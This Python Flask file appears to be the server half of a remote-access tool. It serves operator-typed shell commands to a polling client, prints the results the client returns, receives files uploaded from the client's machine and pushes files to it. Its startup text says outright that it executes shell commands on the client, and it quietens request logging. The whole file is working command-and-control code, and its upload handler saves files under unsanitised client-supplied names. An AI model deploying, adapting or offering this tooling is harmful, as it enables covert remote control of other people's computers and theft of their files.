from flask import Flask, request, send_file
import subprocess
import os
import logging

app = Flask(__name__)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route('/get_command', methods=['GET'])
def get_command():
    command = input("$>> ")
    return command

@app.route('/send_result', methods=['POST'])
def send_result():
    result = request.data.decode()
    print("Result from client:\n" + result)
    return "Result received!"

@app.route('/get_file', methods=['POST'])
def get_file():
    if 'file' not in request.files:
        return "No file provided.", 400

    file = request.files['file']
    if file.filename == '':
        return "No filename provided.", 400

    file.save(file.filename)
    print("File '" + file.filename + "' downloaded from client via GET.")
    return "File received!"

@app.route('/put_file', methods=['GET'])
def put_file():
    filename = request.args.get('filename')
    if not filename:
        return "Filename not provided.", 400

    
    if not os.path.isabs(filename):
        filename = os.path.abspath(filename)  

    print(f"Looking for file at: {filename}")  

    if not os.path.exists(filename):
        print(f"File not found on server: {filename}")
        return "File not found on server.", 404

    return send_file(filename, as_attachment=True)


def start_server():
    print("1. To upload a file to the client, type: put <filename>")
    print("2. To download a file from the client, type: get <filename>")
    print("3. To execute a shell command on the client, type: <command>")
    app.run(host='0.0.0.0', port=5000)

if __name__ == '__main__':
    start_server()